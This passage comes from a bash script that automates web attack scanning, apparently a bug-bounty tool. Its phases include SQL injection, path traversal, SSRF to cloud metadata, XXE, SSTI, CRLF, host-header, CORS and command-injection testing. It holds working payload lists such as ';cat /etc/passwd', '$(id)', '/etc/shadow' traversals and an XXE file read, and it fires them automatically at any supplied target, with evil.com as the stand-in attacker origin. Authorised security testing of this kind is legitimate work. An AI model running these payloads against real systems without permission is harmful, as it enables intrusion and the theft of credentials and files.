  if has kxss && [[ -s "$XSS_TARGETS" ]]; then
    cat "$XSS_TARGETS" | kxss 2>/dev/null > "$OUT/xss/kxss_reflected.txt" || true
    KXSS_COUNT=$(wc -l < "$OUT/xss/kxss_reflected.txt" 2>/dev/null || echo 0)
    ok "kxss reflected: $KXSS_COUNT"
  fi

  # Dalfox — deep scan
  if has dalfox && [[ -s "$XSS_TARGETS" ]]; then
    DALFOX_ARGS="--silence --no-color --output '$OUT/xss/dalfox_results.txt' --timeout 10 --worker 20"
    [[ -n "$COOKIE" ]]  && DALFOX_ARGS+=" --cookie '$COOKIE'"
    [[ -n "$PROXY" ]]   && DALFOX_ARGS+=" --proxy $PROXY"
    eval "dalfox file '$XSS_TARGETS' $DALFOX_ARGS" 2>/dev/null || true
    XSS_COUNT=$(grep -c "POC" "$OUT/xss/dalfox_results.txt" 2>/dev/null || echo 0)
    ok "XSS findings (dalfox): $XSS_COUNT"
    [[ $XSS_COUNT -gt 0 ]] && {
      found "XSS: $XSS_COUNT vulnerabilities"
      notify "🚨 XSS — *$XSS_COUNT* confirmed on \`$TARGET\`!"
    }
  fi

  # DOM XSS patterns from JS
  grep -rh "document.write\|innerHTML\|eval(\|setTimeout(\|location.hash\|window.location" \
    "$OUT/js/" 2>/dev/null | head -30 > "$OUT/xss/dom_xss_patterns.txt" || true
  DOM_COUNT=$(wc -l < "$OUT/xss/dom_xss_patterns.txt" 2>/dev/null || echo 0)
  [[ $DOM_COUNT -gt 0 ]] && ok "DOM XSS patterns: $DOM_COUNT (manual verify needed)"
}

# ═════════════════════════════════════════════════════════════
phase_open_redirect() {
# PHASE 7.5 — OPEN REDIRECT
# ═════════════════════════════════════════════════════════════

  REDIRECT_PARAMS="url|uri|path|dest|destination|redirect|return|returnurl|return_url|goto|next|continue|target|redir|to|link|forward|location|window|back"
  OR_PAYLOADS=(
    "https://evil.com"
    "//evil.com"
    "/\\evil.com"
    "https:evil.com"
    "///evil.com"
    "\\\\evil.com"
  )

  ok "Testing open redirects..."
  grep -iE "(\?|&)($REDIRECT_PARAMS)=" "$ALL_URLS" 2>/dev/null \
    | head -100 > "$OUT/openredirect/candidates.txt" || true

  CAND=$(wc -l < "$OUT/openredirect/candidates.txt" 2>/dev/null || echo 0)
  ok "Open redirect candidates: $CAND"

  [[ $CAND -gt 0 ]] && \
  head -50 "$OUT/openredirect/candidates.txt" | while read -r url; do
    for payload in "${OR_PAYLOADS[@]}"; do
      enc_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
      test_url=$(echo "$url" | sed -E "s|(($REDIRECT_PARAMS)=)[^&]*|\1${enc_payload}|g")
      location=$(safe_curl "-I -o /dev/null -D - '$test_url'" 2>/dev/null | grep -i "^location:" | head -1 || true)
      if echo "$location" | grep -qi "evil.com"; then
        found "Open Redirect: $test_url → $location"
        echo "$test_url" >> "$OUT/openredirect/confirmed.txt"
        notify "⚡ OPEN REDIRECT confirmed: \`$test_url\`"
      fi
    done
  done

  CONFIRMED=$(wc -l < "$OUT/openredirect/confirmed.txt" 2>/dev/null || echo 0)
  ok "Open redirects confirmed: $CONFIRMED"
}

# ═════════════════════════════════════════════════════════════
phase_8() {
# PHASE 8 — SQL INJECTION
# ═════════════════════════════════════════════════════════════

  SQLI_TARGETS="$OUT/sqli/targets.txt"
  grep "?" "$ALL_URLS" 2>/dev/null \
    | grep -v "%3F\|%27\|%22\|CAST\|UNION\|SELECT\|SLEEP\|DBMS\|XMLType" \
    | grep -vE "^http.{200,}" \
    | sort -u | head -50 > "$SQLI_TARGETS" || true

  # gf patterns for SQLi
  has gf && cat "$ALL_URLS" | gf sqli 2>/dev/null >> "$SQLI_TARGETS" || true
  sort -u "$SQLI_TARGETS" -o "$SQLI_TARGETS"

  if has sqlmap && [[ -s "$SQLI_TARGETS" ]]; then
    SQLMAP_ARGS="--batch --random-agent --level=2 --risk=1 --threads=3 --timeout=10 --retries=1 --output-dir='$OUT/sqli/sqlmap_out' --no-cast"
    [[ -n "$COOKIE" ]]  && SQLMAP_ARGS+=" --cookie='$COOKIE'"
    [[ -n "$PROXY" ]]   && SQLMAP_ARGS+=" --proxy='$PROXY'"
    $DEEP && SQLMAP_ARGS="${SQLMAP_ARGS/--level=2/--level=3} ${SQLMAP_ARGS/--risk=1/--risk=2}"
    eval "timeout 300 sqlmap -m '$SQLI_TARGETS' $SQLMAP_ARGS" 2>/dev/null || true
    ok "SQLMap done → $OUT/sqli/sqlmap_out/"
    notify "💉 Phase 8 done — SQLMap complete"
  fi

  # Manual error-based check as fallback
  SQLI_PAYLOADS=("'" "\"" "1' OR '1'='1" "1 AND 1=1--" "' OR 1=1--" "';--" "1;WAITFOR DELAY '0:0:5'--")
  SQLI_ERRORS=("sql syntax" "mysql_fetch" "ORA-0" "syntax error near" "unclosed quotation" "pg_query" "sqlite3" "mssql" "mariadb")

  head -30 "$SQLI_TARGETS" | while read -r url; do
    for payload in "${SQLI_PAYLOADS[@]}"; do
      enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
      test_url=$(echo "$url" | sed "s/=\([^&]*\)/=$enc/g")
      resp=$(safe_curl "'$test_url'" 2>/dev/null | tr '[:upper:]' '[:lower:]' || true)
      for err in "${SQLI_ERRORS[@]}"; do
        if echo "$resp" | grep -q "$err"; then
          found "SQLi error ($err): $test_url"
          echo "$test_url | $err" >> "$OUT/sqli/potential_sqli.txt"
          notify "🚨 SQLi detected: \`$test_url\`"
          break
        fi
      done
    done
  done
}

# ═════════════════════════════════════════════════════════════
phase_lfi() {
# PHASE 8.5 — LFI / PATH TRAVERSAL
# ═════════════════════════════════════════════════════════════

  LFI_TARGETS="$OUT/lfi/candidates.txt"
  # Find file-related params
  grep -iE "(\?|&)(file|path|include|page|doc|document|dir|folder|load|read|template|lang|module|component|view|layout|style|url|content)=" \
    "$ALL_URLS" 2>/dev/null | head -100 > "$LFI_TARGETS" || true

  has gf && cat "$ALL_URLS" | gf lfi 2>/dev/null >> "$LFI_TARGETS" || true
  sort -u "$LFI_TARGETS" -o "$LFI_TARGETS"

  LFI_SIGS=("root:x:0:" "[boot loader]" "for 16-bit" "daemon:x:" "bin/bash" "bin/sh" "etc/passwd")
  LFI_PAYLOADS_BASIC=(
    "../../etc/passwd" "../../../etc/passwd" "../../../../etc/passwd"
    "..%2F..%2Fetc%2Fpasswd" "....//....//etc/passwd"
    "%2F..%2F..%2Fetc%2Fpasswd" "..%252f..%252fetc%252fpasswd"
    "/etc/passwd" "/etc/shadow" "/proc/self/environ"
    "C:\\Windows\\System32\\drivers\\etc\\hosts"
    "....\/....\/etc/passwd"
  )

  # Use ffuf with LFI wordlist if available
  if has ffuf && [[ -f "$WL_LFI" ]]; then
    head -20 "$LFI_TARGETS" | while read -r url; do
      SAFE=$(echo "$url" | sed 's|https\?://||;s|[?&=:/]|_|g' | head -c 50)
      # Replace last param value with FUZZ
      fuzz_url=$(echo "$url" | sed -E 's/([?&][^=&]+)=[^&]*$/\1=FUZZ/')
      eval "ffuf -u '$fuzz_url' -w '$WL_LFI' -mr 'root:x|\\[boot\\]' -t 20 -s \
        -o '$OUT/lfi/ffuf_lfi_${SAFE}.json' -of json" 2>/dev/null || true
    done
  fi

  # Manual check
  ok "Manual LFI check..."
  head -50 "$LFI_TARGETS" | while read -r url; do
    for payload in "${LFI_PAYLOADS_BASIC[@]}"; do
      enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
      test_url=$(echo "$url" | sed -E "s/([?&][^=&]+)=[^&]*/\1=$enc/g")
      resp=$(safe_curl "'$test_url'" 2>/dev/null || true)
      for sig in "${LFI_SIGS[@]}"; do
        if echo "$resp" | grep -q "$sig"; then
          found "LFI confirmed ($sig): $test_url"
          echo "$test_url | payload=$payload | sig=$sig" >> "$OUT/lfi/confirmed_lfi.txt"
          notify "🚨 LFI CONFIRMED: \`$test_url\`"
          break
        fi
      done
    done
  done

  CONFIRMED=$(wc -l < "$OUT/lfi/confirmed_lfi.txt" 2>/dev/null || echo 0)
  ok "LFI confirmed: $CONFIRMED"
}

# ═════════════════════════════════════════════════════════════
phase_9() {
# PHASE 9 — SSRF DETECTION
# ═════════════════════════════════════════════════════════════

  SSRF_PARAMS="url|uri|path|dest|redirect|next|ref|return|returnurl|window|host|target|to|link|src|source|data|href|load|fetch|open|continue|domain|callback|webhook|endpoint|api|proxy|forward"
  SSRF_PAYLOADS=(
    "http://169.254.169.254/latest/meta-data/"
    "http://metadata.google.internal/"
    "http://169.254.169.254/metadata/v1/"
    "http://192.168.0.1/"
    "http://localhost/"
    "http://127.0.0.1/"
    "dict://127.0.0.1:6379/info"
    "file:///etc/passwd"
    "http://[::]:80/"
    "http://0.0.0.0/"
  )

  grep -iE "(\?|&)($SSRF_PARAMS)=" "$ALL_URLS" 2>/dev/null \
    | grep -v "%\|CAST\|SELECT" | head -100 > "$OUT/ssrf/ssrf_candidates.txt" || true

  SSRF_CAND=$(wc -l < "$OUT/ssrf/ssrf_candidates.txt" 2>/dev/null || echo 0)
  ok "SSRF candidates: $SSRF_CAND"

  [[ $SSRF_CAND -gt 0 ]] && \
  head -30 "$OUT/ssrf/ssrf_candidates.txt" | while read -r url; do
    for payload in "${SSRF_PAYLOADS[@]}"; do
      enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload', safe=''))" 2>/dev/null || echo "$payload")
      test_url=$(python3 -c "
import urllib.parse, re, sys
url = '$url'
enc = '$enc'
result = re.sub(r'($SSRF_PARAMS)=([^&]*)', r'\1=' + enc, url, flags=re.IGNORECASE)
print(result)
" 2>/dev/null || echo "$url")
      resp=$(safe_curl "'$test_url'" 2>/dev/null || true)
      if echo "$resp" | grep -qE "(ami-id|instance-id|local-hostname|computeMetadata|aws_|gcloud|root:x:0)"; then
        found "SSRF confirmed: $test_url"
        echo "$test_url" >> "$OUT/ssrf/confirmed_ssrf.txt"
        notify "🚨 SSRF CONFIRMED: \`$test_url\`"
      fi
    done
  done
}

# ═════════════════════════════════════════════════════════════
phase_cors() {
# PHASE 9.1 — CORS MISCONFIGURATION
# ═════════════════════════════════════════════════════════════

  CORS_ORIGINS=("https://evil.com" "null" "https://${TARGET}.evil.com" "https://evil.${TARGET}")
  > "$OUT/cors/cors_issues.txt"

  ok "Testing CORS on $(wc -l < "$LIVE_URLS" 2>/dev/null || echo 0) hosts..."
  head -30 "$LIVE_URLS" | while read -r url; do
    for origin in "${CORS_ORIGINS[@]}"; do
      resp=$(safe_curl "-I -H 'Origin: $origin' '$url'" 2>/dev/null || true)
      acao=$(echo "$resp" | grep -i "Access-Control-Allow-Origin:" | head -1)
      acac=$(echo "$resp" | grep -i "Access-Control-Allow-Credentials:" | head -1)

      if echo "$acao" | grep -q "$origin"; then
        if echo "$acac" | grep -qi "true"; then
          found "CORS critical (allow+credentials): $url with origin $origin"
          echo "CRITICAL | $url | origin=$origin | $acao | $acac" >> "$OUT/cors/cors_issues.txt"
          notify "🚨 CORS CRITICAL: \`$url\` — credentials exposed!"
        else
          found "CORS misconfiguration: $url with origin $origin"
          echo "LOW | $url | origin=$origin | $acao" >> "$OUT/cors/cors_issues.txt"
        fi
      fi
    done
  done

  # Corsy (if installed)
  if [[ -f "/opt/corsy/corsy.py" ]]; then
    python3 /opt/corsy/corsy.py \
      -i "$LIVE_URLS" -t 10 \
      -o "$OUT/cors/corsy_results.txt" 2>/dev/null || true
    ok "Corsy scan complete"
  fi

  CORS_ISSUES=$(wc -l < "$OUT/cors/cors_issues.txt" 2>/dev/null || echo 0)
  ok "CORS issues: $CORS_ISSUES"
}

# ═════════════════════════════════════════════════════════════
phase_ssti() {
# PHASE 9.2 — SSTI (Server-Side Template Injection)
# ═════════════════════════════════════════════════════════════

  SSTI_CANARY="49"
  SSTI_PAYLOADS=(
    "{{7*7}}" "\${7*7}" "<%= 7*7 %>" "\${{7*7}}" "#{7*7}" "*{7*7}" "{{7*'7'}}"
    "{{config}}" "{{self}}" "${7*7}" "{{''.__class__}}"
  )

  ok "Testing SSTI on param URLs..."
  head -50 "$PARAM_URLS" | while read -r url; do
    for payload in "${SSTI_PAYLOADS[@]}"; do
      enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
      test_url=$(echo "$url" | sed -E "s/([?&][^=&]+)=[^&]*/\1=$enc/g")
      resp=$(safe_curl "'$test_url'" 2>/dev/null || true)
      if echo "$resp" | grep -qE "^49$|>49<|\"49\"|\b49\b"; then
        found "SSTI confirmed (payload=$payload): $test_url"
        echo "$test_url | $payload" >> "$OUT/ssti/confirmed_ssti.txt"
        notify "🚨 SSTI CONFIRMED: \`$test_url\`"
      fi
    done
  done

  SSTI_COUNT=$(wc -l < "$OUT/ssti/confirmed_ssti.txt" 2>/dev/null || echo 0)
  ok "SSTI confirmed: $SSTI_COUNT"
}

# ═════════════════════════════════════════════════════════════
phase_host_header() {
# PHASE 9.3 — HOST HEADER INJECTION
# ═════════════════════════════════════════════════════════════

  HOST_PAYLOADS=("evil.com" "evil.com:80" "${TARGET}.evil.com" "evil.com%0d%0aX-Injected: yes")
  > "$OUT/hostinject/issues.txt"

  ok "Testing host header injection..."
  head -20 "$LIVE_URLS" | while read -r url; do
    for payload in "${HOST_PAYLOADS[@]}"; do
      resp=$(safe_curl "-H 'Host: $payload' '$url'" 2>/dev/null || true)
      code=$(safe_curl "-o /dev/null -w '%{http_code}' -H 'Host: $payload' '$url'" 2>/dev/null || echo "000")

      # Check if evil host reflected in response
      if echo "$resp" | grep -q "$payload" || echo "$resp" | grep -qi "evil.com"; then
        found "Host header injection: $url (Host: $payload)"
        echo "$url | Host: $payload" >> "$OUT/hostinject/issues.txt"
      fi

      # X-Forwarded-Host injection
      resp2=$(safe_curl "-H 'X-Forwarded-Host: evil.com' '$url'" 2>/dev/null || true)
      if echo "$resp2" | grep -qi "evil.com"; then
        found "X-Forwarded-Host injection: $url"
        echo "$url | X-Forwarded-Host: evil.com" >> "$OUT/hostinject/issues.txt"
      fi
    done
  done

  ok "Host header issues: $(wc -l < "$OUT/hostinject/issues.txt" 2>/dev/null || echo 0)"
}

# ═════════════════════════════════════════════════════════════
phase_crlf() {
# PHASE 9.4 — CRLF INJECTION
# ═════════════════════════════════════════════════════════════

  if has crlfuzz; then
    ok "Running crlfuzz..."
    crlfuzz -l "$LIVE_URLS" \
      -o "$OUT/crlf/crlfuzz_results.txt" \
      -t 20 -s 2>/dev/null || true
    CRLF_COUNT=$(wc -l < "$OUT/crlf/crlfuzz_results.txt" 2>/dev/null || echo 0)
    ok "CRLF issues: $CRLF_COUNT"
    [[ $CRLF_COUNT -gt 0 ]] && {
      found "CRLF injection: $CRLF_COUNT"
      notify "🚨 CRLF INJECTION: \`$CRLF_COUNT\` findings on $TARGET"
    }
    return
  fi

  # Manual CRLF
  CRLF_PAYLOADS=(
    "%0d%0aX-Beast: injected"
    "%0aX-Beast: injected"
    "%0d%0a%20X-Beast: injected"
    "a%0d%0aSet-Cookie:beast=injected"
    "a%0aSet-Cookie:beast=injected"
  )

  head -20 "$LIVE_URLS" | while read -r url; do
    for payload in "${CRLF_PAYLOADS[@]}"; do
      resp=$(safe_curl "-I '${url}/${payload}'" 2>/dev/null || true)
      if echo "$resp" | grep -qi "X-Beast\|beast=injected"; then
        found "CRLF Injection: $url/$payload"
        echo "$url | $payload" >> "$OUT/crlf/confirmed_crlf.txt"
        notify "🚨 CRLF CONFIRMED: \`$url\`"
      fi
    done
  done
}

# ═════════════════════════════════════════════════════════════
phase_xxe() {
# PHASE 9.5 — XXE INJECTION
# ═════════════════════════════════════════════════════════════

  XXE_PAYLOAD='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
  XXE_PAYLOAD_SSRF='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><root>&xxe;</root>'

  ok "Testing XXE on endpoints accepting XML/JSON..."
  # Find XML/SOAP endpoints
  grep -iE "(xml|soap|wsdl|\\.asmx|graphql)" "$ALL_URLS" 2>/dev/null \
    | head -30 > "$OUT/xxe/xml_endpoints.txt" || true

  head -20 "$OUT/xxe/xml_endpoints.txt" | while read -r url; do
    for ct in "application/xml" "text/xml"; do
      resp=$(safe_curl "-X POST -H 'Content-Type: $ct' -d '$XXE_PAYLOAD' '$url'" 2>/dev/null || true)
      if echo "$resp" | grep -q "root:x"; then
        found "XXE confirmed (file read): $url"
        echo "$url | $ct" >> "$OUT/xxe/confirmed_xxe.txt"
        notify "🚨 XXE CONFIRMED: \`$url\`"
      fi
    done
  done

  ok "XXE check complete"
}

# ═════════════════════════════════════════════════════════════
phase_cmdi() {
# PHASE 9.6 — COMMAND INJECTION
# ═════════════════════════════════════════════════════════════

  CMDI_CANARY="beast_cmdi_$(date +%s)"
  CMDI_PAYLOADS=(
    ";id" "&&id" "|id" "\`id\`" "\$(id)"
    ";sleep 5" "&&sleep 5" "|sleep 5"
    ";echo $CMDI_CANARY" "&&echo $CMDI_CANARY"
    ";cat /etc/passwd" "|cat /etc/passwd"
  )

  # commix
  if [[ -f "/opt/commix/commix.py" ]] && [[ -s "$PARAM_URLS" ]]; then
    ok "Running Commix command injection scanner..."
    COMMIX_ARGS="--batch --level=2 --output-dir='$OUT/cmdi'"
    [[ -n "$COOKIE" ]] && COMMIX_ARGS+=" --cookie='$COOKIE'"
    head -20 "$PARAM_URLS" | while read -r url; do
      eval "timeout 60 python3 /opt/commix/commix.py -u '$url' $COMMIX_ARGS" 2>/dev/null || true
    done
  fi

  # Manual check
  ok "Manual command injection check..."
  head -30 "$PARAM_URLS" | while read -r url; do
    for payload in ";id" "&&id" "|id"; do
      enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
      test_url=$(echo "$url" | sed -E "s/([?&][^=&]+)=[^&]*/\1=$enc/g")
      resp=$(safe_curl "'$test_url'" 2>/dev/null || true)
      if echo "$resp" | grep -qE "uid=[0-9]|gid=[0-9]|root|daemon|www-data"; then
        found "Command Injection: $test_url"
        echo "$test_url | $payload" >> "$OUT/cmdi/confirmed_cmdi.txt"
        notify "🚨 COMMAND INJECTION: \`$test_url\`"
      fi
    done
  done

  ok "Command injection check complete"
}

# ═════════════════════════════════════════════════════════════
phase_smuggling() {
# PHASE 9.7 — HTTP REQUEST SMUGGLING
# ═════════════════════════════════════════════════════════════

  if [[ ! -f "/opt/smuggler/smuggler.py" ]]; then
    warn "smuggler not installed — basic smuggling check only"
    # Basic CL.TE check with curl
    head -5 "$LIVE_URLS" | while read -r url; do
      host=$(echo "$url" | grep -oP '(?<=://)[^/]+')
      resp=$(safe_curl "-X POST \
        -H 'Transfer-Encoding: chunked' \
        -H 'Content-Length: 4' \
        -d '1\r\nG\r\n0\r\n\r\n' \
        '$url'" 2>/dev/null || true)
      # Only flag if timeout (5s extra = likely CL.TE)
    done
    return
  fi

  ok "Running HTTP request smuggling tests..."
  head -10 "$LIVE_URLS" | while read -r url; do
    python3 /opt/smuggler/smuggler.py \
      -u "$url" \
      -l "$OUT/smuggling/smuggler_$(echo "$url" | md5sum | cut -c1-8).txt" \
      2>/dev/null || true
  done

  grep -rl "Potential" "$OUT/smuggling/" 2>/dev/null | while read -r f; do
    found "HTTP Smuggling candidate: $(cat "$f" | grep 'Potential' | head -1)"
    cat "$f" >> "$OUT/smuggling/confirmed.txt"
    notify "🚨 HTTP SMUGGLING candidate found"
  done

  ok "Smuggling tests complete"
}

# ═════════════════════════════════════════════════════════════
phase_takeover() {
# PHASE 9.8 — SUBDOMAIN TAKEOVER
# ═════════════════════════════════════════════════════════════

  # subzy
  if has subzy && [[ -s "$SUBS_ALL" ]]; then
    subzy run \
      --targets "$SUBS_ALL" \
      --concurrency 20 \
      --output "$OUT/takeover/subzy_results.json" \
      --hide-fails 2>/dev/null || true
    TAKE_COUNT=$(grep -c "VULNERABLE" "$OUT/takeover/subzy_results.json" 2>/dev/null || echo 0)
    ok "Subzy vulnerable: $TAKE_COUNT"
    [[ $TAKE_COUNT -gt 0 ]] && {
      found "Subdomain takeover: $TAKE_COUNT"
      notify "🚨 SUBDOMAIN TAKEOVER: $TAKE_COUNT vulnerable on $TARGET!"
    }
  fi

  # Nuclei takeover templates
  if has nuclei && [[ -s "$SUBS_ALL" ]]; then
    nuclei -l "$SUBS_ALL" \
      -tags takeover \
      -silent -o "$OUT/takeover/nuclei_takeover.txt" \
      -timeout 10 2>/dev/null || true
    ok "Nuclei takeover check complete"
  fi

  # CNAME dangling check
  ok "Checking for dangling CNAME..."
  cat "$SUBS_ALL" | while read -r sub; do
    cname=$(dig CNAME "$sub" +short 2>/dev/null || true)
    [[ -z "$cname" ]] && continue
    ip=$(dig A "$cname" +short 2>/dev/null || true)
    if [[ -z "$ip" ]]; then
      found "Dangling CNAME: $sub → $cname (no A record)"
      echo "$sub CNAME $cname (unresolved)" >> "$OUT/takeover/dangling_cnames.txt"
    fi
  done 2>/dev/null || true
}

# ═════════════════════════════════════════════════════════════
phase_cloud() {
# PHASE 9.9 — CLOUD STORAGE ENUMERATION
# ═════════════════════════════════════════════════════════════

  COMPANY=$(echo "$TARGET" | sed 's/\..*//')

  # S3 scanner
  if has s3scanner; then
    ok "Scanning S3 buckets..."
    s3scanner scan --bucket "$COMPANY" --output-file "$OUT/cloud/s3_results.txt" 2>/dev/null || true
    s3scanner scan --bucket "${COMPANY}-backup" --output-file "$OUT/cloud/s3_backup.txt" 2>/dev/null || true
  fi

  # cloud_enum
  if [[ -f "/opt/cloud_enum/cloud_enum.py" ]]; then
    ok "Running cloud_enum..."
    python3 /opt/cloud_enum/cloud_enum.py \
      -k "$COMPANY" -k "$TARGET" \
      --disable-gcp --disable-azure \
      --quickscan \
      -l "$OUT/cloud/cloud_enum_results.txt" 2>/dev/null || true
  fi

  # Manual bucket checks
  ok "Checking common cloud storage patterns..."
  BUCKET_NAMES=("$COMPANY" "${COMPANY}-backup" "${COMPANY}-dev" "${COMPANY}-prod" "${COMPANY}-assets" "${COMPANY}-static" "${COMPANY}-files" "${COMPANY}-data" "${COMPANY}-uploads" "${TARGET}")

  for bucket in "${BUCKET_NAMES[@]}"; do
    # AWS S3
    status=$(curl -sk -o /dev/null -w "%{http_code}" "https://${bucket}.s3.amazonaws.com/" 2>/dev/null || echo "000")
    [[ "$status" == "200" || "$status" == "403" ]] && {
      found "S3 bucket exists (HTTP $status): ${bucket}.s3.amazonaws.com"
      echo "${bucket}.s3.amazonaws.com ($status)" >> "$OUT/cloud/buckets_found.txt"
    }

    # GCS
    status=$(curl -sk -o /dev/null -w "%{http_code}" "https://storage.googleapis.com/${bucket}/" 2>/dev/null || echo "000")
    [[ "$status" == "200" || "$status" == "403" ]] && {
      found "GCS bucket exists (HTTP $status): $bucket"
      echo "GCS: $bucket ($status)" >> "$OUT/cloud/buckets_found.txt"
    }

    # Azure Blob
    status=$(curl -sk -o /dev/null -w "%{http_code}" "https://${bucket}.blob.core.windows.net/" 2>/dev/null || echo "000")
    [[ "$status" == "200" || "$status" == "400" ]] && {
      found "Azure blob exists (HTTP $status): ${bucket}.blob.core.windows.net"
      echo "Azure: ${bucket}.blob.core.windows.net ($status)" >> "$OUT/cloud/buckets_found.txt"
    }
  done

  ok "Cloud enum complete → $OUT/cloud/"
}

# ═════════════════════════════════════════════════════════════
phase_graphql() {
# PHASE 9.10 — GRAPHQL INTROSPECTION
# ═════════════════════════════════════════════════════════════

  GQL_ENDPOINTS=("/graphql" "/api/graphql" "/v1/graphql" "/query" "/gql" "/graph" "/graphiql")
  INTROSPECTION_QUERY='{"query":"{__schema{types{name fields{name}}}}"}'

  ok "Testing GraphQL introspection..."
  head -20 "$LIVE_URLS" | while read -r base; do
    for ep in "${GQL_ENDPOINTS[@]}"; do
      url="${base%/}${ep}"
      resp=$(safe_curl "-X POST -H 'Content-Type: application/json' -d '$INTROSPECTION_QUERY' '$url'" 2>/dev/null || true)

      if echo "$resp" | grep -q "__schema"; then
        found "GraphQL introspection enabled: $url"
        echo "$resp" > "$OUT/graphql/introspection_$(echo "$url" | md5sum | cut -c1-8).json"
        echo "$url" >> "$OUT/graphql/vulnerable.txt"
        notify "🔍 GRAPHQL INTROSPECTION: \`$url\`"

        # Also test for batching
        BATCH='[{"query":"{__schema{types{name}}}"},{"query":"{__schema{types{name}}}"}]'
        batch_resp=$(safe_curl "-X POST -H 'Content-Type: application/json' -d '$BATCH' '$url'" 2>/dev/null || true)
        echo "$batch_resp" | grep -q "__schema" && \
          found "GraphQL batching enabled: $url" && \
          echo "BATCHING: $url" >> "$OUT/graphql/vulnerable.txt"
      fi

      # Check for playground / GraphiQL exposure
      code=$(safe_curl "-o /dev/null -w '%{http_code}' '$url'" 2>/dev/null || echo "000")
      [[ "$code" == "200" ]] && {
        resp2=$(safe_curl "'$url'" 2>/dev/null || true)
        echo "$resp2" | grep -qi "graphiql\|playground\|graphql-playground" && \
          found "GraphQL IDE exposed: $url"
      }
    done
  done

  ok "GraphQL check complete"
}

# ═════════════════════════════════════════════════════════════
phase_websocket() {
# PHASE 9.11 — WEBSOCKET DETECTION
# ═════════════════════════════════════════════════════════════

  ok "Detecting WebSocket endpoints..."
  head -20 "$LIVE_URLS" | while read -r url; do
    ws_url=$(echo "$url" | sed 's|https|wss|;s|http|ws|')

    resp=$(safe_curl \
      "-H 'Upgrade: websocket' \
       -H 'Connection: Upgrade' \
       -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
       -H 'Sec-WebSocket-Version: 13' \
       -I '$url'" 2>/dev/null || true)

    if echo "$resp" | grep -qi "101\|websocket\|upgrade"; then
      found "WebSocket endpoint: $url (ws/wss)"
      echo "$url" >> "$OUT/websocket/endpoints.txt"

      # Check for origin bypass
      resp2=$(safe_curl \
        "-H 'Origin: https://evil.com' \
         -H 'Upgrade: websocket' \
         -H 'Connection: Upgrade' \
         -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
         -H 'Sec-WebSocket-Version: 13' \
         -I '$url'" 2>/dev/null || true)
      echo "$resp2" | grep -qi "101" && \
        found "WebSocket origin not validated: $url" && \
        echo "ORIGIN_BYPASS: $url" >> "$OUT/websocket/issues.txt"
    fi
  done

  # Find ws:// links in crawled content
  grep -h "ws://" "$CRAWLED_URLS" 2>/dev/null >> "$OUT/websocket/endpoints.txt" || true
  grep -rh "ws://" "$OUT/js/" 2>/dev/null >> "$OUT/websocket/endpoints.txt" || true

  ok "WebSocket check complete"
}

# ═════════════════════════════════════════════════════════════
phase_10() {
# PHASE 10 — NUCLEI SCAN
# ═════════════════════════════════════════════════════════════

  if ! has nuclei || [[ ! -f "$LIVE_URLS" ]]; then
    warn "Nuclei skipped"; TOTAL_VULNS=0; CRIT=0; HIGH=0; MED=0; LOW=0; return
  fi

  nuclei -update-templates -silent 2>/dev/null || true

  NUCLEI_ARGS="-l '$LIVE_URLS' \
    -severity low,medium,high,critical \
    -tags cve,sqli,xss,ssrf,lfi,rce,auth-bypass,exposure,misconfig,default-login,takeover,cors,ssti,xxe,file-read,oast \
    -rl $RATE -bulk-size 25 -c 10 -timeout 10 \
    -o '$NUCLEI_OUT' -jsonl '$NUCLEI_JSON' -silent"

  [[ -n "$PROXY" ]]  && NUCLEI_ARGS+=" -proxy '$PROXY'"
  $DEEP && NUCLEI_ARGS+=" -severity info,low,medium,high,critical"

  eval "nuclei $NUCLEI_ARGS" 2>/dev/null || true

  TOTAL_VULNS=$(wc -l < "$NUCLEI_OUT" 2>/dev/null || echo 0)
  CRIT=$(grep -ic "\[critical\]" "$NUCLEI_OUT" 2>/dev/null || echo 0)
  HIGH=$(grep -ic "\[high\]" "$NUCLEI_OUT" 2>/dev/null || echo 0)
  MED=$(grep -ic "\[medium\]" "$NUCLEI_OUT" 2>/dev/null || echo 0)
  LOW=$(grep -ic "\[low\]" "$NUCLEI_OUT" 2>/dev/null || echo 0)

  ok "Nuclei: $TOTAL_VULNS findings | Crit:$CRIT High:$HIGH Med:$MED Low:$LOW"

  [[ $CRIT -gt 0 || $HIGH -gt 0 ]] && {
    notify "🔥 NUCLEI — *$CRIT critical, $HIGH high* on \`$TARGET\`!"
    # Save critical/high separately
    grep -i "\[critical\]\|\[high\]" "$NUCLEI_OUT" 2>/dev/null > "$OUT/vuln/nuclei_critical_high.txt" || true
  }

  # Export readable
  export TOTAL_VULNS CRIT HIGH MED LOW
}

# ═════════════════════════════════════════════════════════════
phase_11() {
# PHASE 11 — JS ANALYSIS
# ═════════════════════════════════════════════════════════════

  # Collect JS files from all sources
  grep "\.js\b" "$ALL_URLS" 2>/dev/null | grep -v "\.json" | sort -u > "$OUT/js/js_files.txt" || true
  # Also from crawled pages
  cat "$CRAWLED_URLS" 2>/dev/null | grep "\.js\b" | grep -v "\.json" | sort -u >> "$OUT/js/js_files.txt" || true
  sort -u "$OUT/js/js_files.txt" -o "$OUT/js/js_files.txt"
  JS_COUNT=$(wc -l < "$OUT/js/js_files.txt" 2>/dev/null || echo 0)
  ok "JS files: $JS_COUNT"

